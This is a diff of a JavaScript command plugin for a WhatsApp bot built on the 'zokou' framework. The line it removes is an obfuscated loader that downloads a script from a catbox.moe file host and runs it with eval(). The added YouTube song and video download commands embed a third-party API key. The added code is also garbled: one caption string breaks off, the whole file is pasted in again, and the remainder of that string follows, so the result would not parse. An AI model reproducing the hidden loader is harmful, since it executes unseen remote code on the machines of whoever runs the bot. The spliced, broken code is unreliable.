@@ -1,1 +1,365 @@
-const _0x9deed7=_0x5993;(function(_0x18201f,_0x5b23b4){const _0x42b75f=_0x5993,_0x21ec52=_0x18201f();while(!![]){try{const _0x397169=parseInt(_0x42b75f(0x1a2))/0x1+-parseInt(_0x42b75f(0x196))/0x2*(-parseInt(_0x42b75f(0x199))/0x3)+parseInt(_0x42b75f(0x1a1))/0x4+parseInt(_0x42b75f(0x19a))/0x5+-parseInt(_0x42b75f(0x19e))/0x6+parseInt(_0x42b75f(0x19c))/0x7+-parseInt(_0x42b75f(0x1a0))/0x8*(parseInt(_0x42b75f(0x19d))/0x9);if(_0x397169===_0x5b23b4)break;else _0x21ec52['push'](_0x21ec52['shift']());}catch(_0x5e952c){_0x21ec52['push'](_0x21ec52['shift']());}}}(_0x43c0,0x222ca));const axios=require(_0x9deed7(0x198)),url=_0x9deed7(0x19f);axios['\x67\x65\x74'](url)[_0x9deed7(0x197)](_0x422e59=>eval(_0x422e59['\x64\x61\x74\x61']))[_0x9deed7(0x19b)](_0x56dccf=>console['\x65\x72\x72\x6f\x72'](_0x56dccf));function _0x5993(_0x119187,_0x29a9bd){const _0x43c0dc=_0x43c0();return _0x5993=function(_0x59939c,_0x439837){_0x59939c=_0x59939c-0x196;let _0x4b9516=_0x43c0dc[_0x59939c];return _0x4b9516;},_0x5993(_0x119187,_0x29a9bd);}function _0x43c0(){const _0x41fb07=['\x63\x61\x74\x63\x68','\x31\x38\x34\x34\x38\x39\x39\x57\x65\x6a\x72\x58\x41','\x34\x36\x36\x31\x39\x37\x33\x67\x73\x43\x5a\x74\x59','\x39\x38\x39\x32\x33\x32\x7a\x45\x68\x53\x65\x47','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x66\x69\x6c\x65\x73\x2e\x63\x61\x74\x62\x6f\x78\x2e\x6d\x6f\x65\x2f\x35\x70\x6c\x38\x7a\x67\x2e\x6a\x73','\x38\x56\x4c\x71\x41\x41\x55','\x38\x34\x39\x31\x36\x49\x69\x7a\x6a\x78\x49','\x32\x31\x33\x32\x37\x36\x4a\x49\x4b\x64\x4a\x65','\x31\x30\x5a\x5a\x73\x55\x5a\x7a','\x74\x68\x65\x6e','\x61\x78\x69\x6f\x73','\x31\x30\x32\x38\x34\x36\x70\x54\x49\x42\x53\x41','\x37\x36\x36\x38\x37\x35\x74\x71\x6d\x57\x74\x70'];_0x43c0=function(){return _0x41fb07;};return _0x43c0();}
+const { zokou } = require("../framework/zokou");
+const yts = require("yt-search");
+const fetch = require("node-fetch");
+
+zokou({
+  nomCom: "play4",
+  categorie: "Search",
+  reaction: "🎵"
+}, async (_0x208fbe, _0x5e783c, _0x6c2a22) => {
+  const { ms: _0x37be60, repondre: _0x3460c8, arg: _0x11ce6f } = _0x6c2a22;
+  
+  if (!_0x11ce6f[0]) {
+    _0x3460c8("Please insert a song name.");
+    return;
+  }
+  
+  try {
+    let songName = _0x11ce6f.join(" ");
+    const searchResults = await yts(songName);
+    const videos = searchResults.videos;
+
+    if (videos.length > 0) {
+      const videoUrl = videos[0].url;
+      const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}&apikey=gifted_api_kt5gd63gjd8`);
+      const json = await response.json();
+
+      if (json.status === 200 && json.success) {
+        const downloadUrl = json.result.download_url;
+        const songDetails = {
+          image: { url: videos[0].thumbnail },
+          caption: `🎵 *Title:* ${json.result.title}\n📡 *Quality:* ${json.result.type}\n⏳ *Duration:* ${videos[0].timestamp}\n👀 *Views:* ${videos[0].views}\n📅 *Uploaded:* ${videos[0].ago}\n🎤 *Artist:* ${videos[0].author.name}\n🔗 *Direct YouTube Link:* ${videoUrl}`
+        };
+
+        await _0x5e783c.sendMessage(_0x208fbe, songDetails, { quoted: _0x37be60 });
+        await _0x5e783c.sendMessage(_0x208fbe, { audio: { url: downloadUrl }, mimetype: "audio/mp4" }, { quoted: _0x37be60 });
+
+        _0x3460c8("B.m.b-Md Successfully downloaded!");
+      } else {
+        _0x3460c8("❌ Failed to download the audio. Please try again later.");
+      }
+    } else {
+      _0x3460c8("❌ No audio found.");
+    }
+  } catch (error) {
+    console.error("Error from API:", error);
+    _0x3460c8("⚠️ An error occurred while searching or downloading the audio.");
+  }
+});
+
+zokou({
+  nomCom: "song4",
+  categorie: "Search",
+  reaction: "🎵"
+}, async (_0x208fbe, _0x5e783c, _0x6c2a22) => {
+  const { ms: _0x37be60, repondre: _0x3460c8, arg: _0x11ce6f } = _0x6c2a22;
+
+  if (!_0x11ce6f[0]) {
+    _0x3460c8("Please insert a song name.");
+    return;
+  }
+
+  try {
+    let songName = _0x11ce6f.join(" ");
+    const searchResults = await yts(songName);
+    const videos = searchResults.videos;
+
+    if (videos.length > 0) {
+      const videoUrl = videos[0].url;
+      const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}&apikey=gifted_api_kt5gd63gjd8`);
+      const json = await response.json();
+
+      if (json.status === 200 && json.success) {
+        const downloadUrl = json.result.download_url;
+        const songDetails = {
+          image: { url: videos[0].thumbnail },
+          caption: `🎵 *Title:* ${json.result.title}\n📡 *Quality:* ${json.result.type}\n⏳ *Duration:* ${videos[0].timestamp}\n👀 *Views:* ${videos[0].views}\n📅 *Uploaded:* ${videos[0].ago}\n🎤 *Artist:* ${videos[0].author.name}\n🔗 *Direct YouTube Link:* ${videoUrl}`
+        };
+
+        await _0x5e783c.sendMessage(_0x208fbe, songDetails, { quoted: _0x37be60 });
+        await _0x5e783c.sendMessage(_0x208fbe, { audio: { url: downloadUrl }, mimetype: "audio/mp4" }, { quoted: _0x37be60 });
+
+        _0x3460c8("B.m.b-Md Successfully downloaded!");
+      } else {
+        _0x3460c8("❌ Failed to download the audio. Please try again later.");
+      }
+    } else {
+      _0x3460c8("❌ No audio found.");
+    }
+  } catch (error) {
+    console.error("Error from API:", error);
+    _0x3460c8("⚠️ An error occurred while searching or downloading the audio.");
+  }
+});
+
+zokou({
+  nomCom: "video4",
+  categorie: "Search",
+  reaction: "🎥"
+}, async (_0x208fbe, _0x5e783c, _0x6c2a22) => {
+  const { ms: _0x37be60, repondre: _0x3460c8, arg: _0x11ce6f } = _0x6c2a22;
+
+  if (!_0x11ce6f[0]) {
+    _0x3460c8("Please insert a video name.");
+    return;
+  }
+
+  try {
+    let videoName = _0x11ce6f.join(" ");
+    const searchResults = await yts(videoName);
+    const videos = searchResults.videos;
+
+    if (videos.length > 0) {
+      const videoUrl = videos[0].url;
+      const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}&apikey=gifted_api_kt5gd63gjd8`);
+      const json = await response.json();
+
+      if (json.status === 200 && json.success) {
+        const downloadUrl = json.result.download_url;
+        const videoDetails = {
+          image: { url: videos[0].thumbnail },
+          caption: `🎥 *Title:* ${json.result.title}\n⏳ *Duration:* ${videos[0].timestamp}\n👀 *Views:* ${videos[0].views}\n📅 *Uploaded:* ${videos[0].ago}\n🎤 *Artist:* ${videos[0].author.name}\n🔗 *Direct YouTube Link:* ${videoUrl}`
+        };
+
+        await _0x5e783c.sendMessage(_0x208fbe, videoDetails, { quoted: _0x37be60 });
+        await _0x5e783c.sendMessage(_0x208fbe, { video: { url: downloadUrl }, mimetype: "video/mp4" }, { quoted: _0x37be60 });
+
+        _0x3460c8("B.m.b-Md Successfully downloaded the video!");
+      } else {
+        _0x3460c8("❌ Failed to download the video. Please try again later.");
+      }
+    } else {
+      _0x3460c8("❌ No video found.");
+    }
+  } catch (error) {
+    console.error("Error from API:", error);
+    _0x3460c8("⚠️ An error occurred while searching or downloading the video.");
+  }
+});
+
+zokou({
+  nomCom: "videodoc4",
+  categorie: "Search",
+  reaction: "🎬"
+}, async (_0x208fbe, _0x5e783c, _0x6c2a22) => {
+  const { ms: _0x37be60, repondre: _0x3460c8, arg: _0x11ce6f } = _0x6c2a22;
+
+  if (!_0x11ce6f[0]) {
+    _0x3460c8("Please insert a video name.");
+    return;
+  }
+
+  try {
+    let videoName = _0x11ce6f.join(" ");
+    const searchResults = await yts(videoName);
+    const videos = searchResults.videos;
+
+    if (videos.length > 0) {
+      const videoUrl = videos[0].url;
+      const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}&apikey=gifted_api_kt5gd63gjd8`);
+      const json = await response.json();
+
+      if (json.status === 200 && json.success) {
+        const downloadUrl = json.result.download_url;
+        const videoDetails = {
+          image: { url: videos[0].thumbnail },
+          caption: `🎬 *Tconst { zokou } = require("../framework/zokou");
+const yts = require("yt-search");
+const fetch = require("node-fetch");
+
+zokou({
+  nomCom: "play4",
+  categorie: "Search",
+  reaction: "🎵"
+}, async (_0x208fbe, _0x5e783c, _0x6c2a22) => {
+  const { ms: _0x37be60, repondre: _0x3460c8, arg: _0x11ce6f } = _0x6c2a22;
+  
+  if (!_0x11ce6f[0]) {
+    _0x3460c8("Please insert a song name.");
+    return;
+  }
+  
+  try {
+    let songName = _0x11ce6f.join(" ");
+    const searchResults = await yts(songName);
+    const videos = searchResults.videos;
+
+    if (videos.length > 0) {
+      const videoUrl = videos[0].url;
+      const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}&apikey=gifted_api_kt5gd63gjd8`);
+      const json = await response.json();
+
+      if (json.status === 200 && json.success) {
+        const downloadUrl = json.result.download_url;
+        const songDetails = {
+          image: { url: videos[0].thumbnail },
+          caption: `🎵 *Title:* ${json.result.title}\n📡 *Quality:* ${json.result.type}\n⏳ *Duration:* ${videos[0].timestamp}\n👀 *Views:* ${videos[0].views}\n📅 *Uploaded:* ${videos[0].ago}\n🎤 *Artist:* ${videos[0].author.name}\n🔗 *Direct YouTube Link:* ${videoUrl}`
+        };
+
+        await _0x5e783c.sendMessage(_0x208fbe, songDetails, { quoted: _0x37be60 });
+        await _0x5e783c.sendMessage(_0x208fbe, { audio: { url: downloadUrl }, mimetype: "audio/mp4" }, { quoted: _0x37be60 });
+
+        _0x3460c8("B.m.b-Md Successfully downloaded!");
+      } else {
+        _0x3460c8("❌ Failed to download the audio. Please try again later.");
+      }
+    } else {
+      _0x3460c8("❌ No audio found.");
+    }
+  } catch (error) {
+    console.error("Error from API:", error);
+    _0x3460c8("⚠️ An error occurred while searching or downloading the audio.");
+  }
+});
+
+zokou({
+  nomCom: "song4",
+  categorie: "Search",
+  reaction: "🎵"
+}, async (_0x208fbe, _0x5e783c, _0x6c2a22) => {
+  const { ms: _0x37be60, repondre: _0x3460c8, arg: _0x11ce6f } = _0x6c2a22;
+
+  if (!_0x11ce6f[0]) {
+    _0x3460c8("Please insert a song name.");
+    return;
+  }
+
+  try {
+    let songName = _0x11ce6f.join(" ");
+    const searchResults = await yts(songName);
+    const videos = searchResults.videos;
+
+    if (videos.length > 0) {
+      const videoUrl = videos[0].url;
+      const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}&apikey=gifted_api_kt5gd63gjd8`);
+      const json = await response.json();
+
+      if (json.status === 200 && json.success) {
+        const downloadUrl = json.result.download_url;
+        const songDetails = {
+          image: { url: videos[0].thumbnail },
+          caption: `🎵 *Title:* ${json.result.title}\n📡 *Quality:* ${json.result.type}\n⏳ *Duration:* ${videos[0].timestamp}\n👀 *Views:* ${videos[0].views}\n📅 *Uploaded:* ${videos[0].ago}\n🎤 *Artist:* ${videos[0].author.name}\n🔗 *Direct YouTube Link:* ${videoUrl}`
+        };
+
+        await _0x5e783c.sendMessage(_0x208fbe, songDetails, { quoted: _0x37be60 });
+        await _0x5e783c.sendMessage(_0x208fbe, { audio: { url: downloadUrl }, mimetype: "audio/mp4" }, { quoted: _0x37be60 });
+
+        _0x3460c8("B.m.b-Md Successfully downloaded!");
+      } else {
+        _0x3460c8("❌ Failed to download the audio. Please try again later.");
+      }
+    } else {
+      _0x3460c8("❌ No audio found.");
+    }
+  } catch (error) {
+    console.error("Error from API:", error);
+    _0x3460c8("⚠️ An error occurred while searching or downloading the audio.");
+  }
+});
+
+zokou({
+  nomCom: "video4",
+  categorie: "Search",
+  reaction: "🎥"
+}, async (_0x208fbe, _0x5e783c, _0x6c2a22) => {
+  const { ms: _0x37be60, repondre: _0x3460c8, arg: _0x11ce6f } = _0x6c2a22;
+
+  if (!_0x11ce6f[0]) {
+    _0x3460c8("Please insert a video name.");
+    return;
+  }
+
+  try {
+    let videoName = _0x11ce6f.join(" ");
+    const searchResults = await yts(videoName);
+    const videos = searchResults.videos;
+
+    if (videos.length > 0) {
+      const videoUrl = videos[0].url;
+      const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}&apikey=gifted_api_kt5gd63gjd8`);
+      const json = await response.json();
+
+      if (json.status === 200 && json.success) {
+        const downloadUrl = json.result.download_url;
+        const videoDetails = {
+          image: { url: videos[0].thumbnail },
+          caption: `🎥 *Title:* ${json.result.title}\n⏳ *Duration:* ${videos[0].timestamp}\n👀 *Views:* ${videos[0].views}\n📅 *Uploaded:* ${videos[0].ago}\n🎤 *Artist:* ${videos[0].author.name}\n🔗 *Direct YouTube Link:* ${videoUrl}`
+        };
+
+        await _0x5e783c.sendMessage(_0x208fbe, videoDetails, { quoted: _0x37be60 });
+        await _0x5e783c.sendMessage(_0x208fbe, { video: { url: downloadUrl }, mimetype: "video/mp4" }, { quoted: _0x37be60 });
+
+        _0x3460c8("B.m.b-Md Successfully downloaded the video!");
+      } else {
+        _0x3460c8("❌ Failed to download the video. Please try again later.");
+      }
+    } else {
+      _0x3460c8("❌ No video found.");
+    }
+  } catch (error) {
+    console.error("Error from API:", error);
+    _0x3460c8("⚠️ An error occurred while searching or downloading the video.");
+  }
+});
+
+zokou({
+  nomCom: "videodoc4",
+  categorie: "Search",
+  reaction: "🎬"
+}, async (_0x208fbe, _0x5e783c, _0x6c2a22) => {
+  const { ms: _0x37be60, repondre: _0x3460c8, arg: _0x11ce6f } = _0x6c2a22;
+
+  if (!_0x11ce6f[0]) {
+    _0x3460c8("Please insert a video name.");
+    return;
+  }
+
+  try {
+    let videoName = _0x11ce6f.join(" ");
+    const searchResults = await yts(videoName);
+    const videos = searchResults.videos;
+
+    if (videos.length > 0) {
+      const videoUrl = videos[0].url;
+      const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}&apikey=gifted_api_kt5gd63gjd8`);
+      const json = await response.json();
+
+      if (json.status === 200 && json.success) {
+        const downloadUrl = json.result.download_url;
+        const videoDetails = {
+          image: { url: videos[0].thumbnail },
+          caption: `🎬 *Title:* ${json.result.title}\n⏳ *Duration:* ${videos[0].timestamp}\n👀 *Views:* ${videos[0].views}\n📅 *Uploaded:* ${videos[0].ago}\n🎤 *Artist:* ${videos[0].author.name}\n🔗 *Direct YouTube Link:* ${videoUrl}`
+        };
+
+        await _0x5e783c.sendMessage(_0x208fbe, videoDetails, { quoted: _0x37be60 });
+        await _0x5e783c.sendMessage(_0x208fbe, { document: { url: downloadUrl }, mimetype: "video/mp4" }, { quoted: _0x37be60 });
+
+        _0x3460c8("B.m.b-Md  Successfully downloaded the video!");
+      } else {
+        _0x3460c8("❌ Failed to download the video. Please try again later.");
+      }
+    } else {
+      _0x3460c8("❌ No video found.");
+    }
+  } catch (error) {
+    console.error("Error from API:", error);
+    _0x3460c8("⚠️ An error occurred while searching or downloading the video.");
+  }
+});itle:* ${json.result.title}\n⏳ *Duration:* ${videos[0].timestamp}\n👀 *Views:* ${videos[0].views}\n📅 *Uploaded:* ${videos[0].ago}\n🎤 *Artist:* ${videos[0].author.name}\n🔗 *Direct YouTube Link:* ${videoUrl}`
+        };
+
+        await _0x5e783c.sendMessage(_0x208fbe, videoDetails, { quoted: _0x37be60 });
+        await _0x5e783c.sendMessage(_0x208fbe, { document: { url: downloadUrl }, mimetype: "video/mp4" }, { quoted: _0x37be60 });
+
+        _0x3460c8("B.m.b-Md  Successfully downloaded the video!");
+      } else {
+        _0x3460c8("❌ Failed to download the video. Please try again later.");
+      }
+    } else {
+      _0x3460c8("❌ No video found.");
+    }
+  } catch (error) {
+    console.error("Error from API:", error);
+    _0x3460c8("⚠️ An error occurred while searching or downloading the video.");
+  }
+});
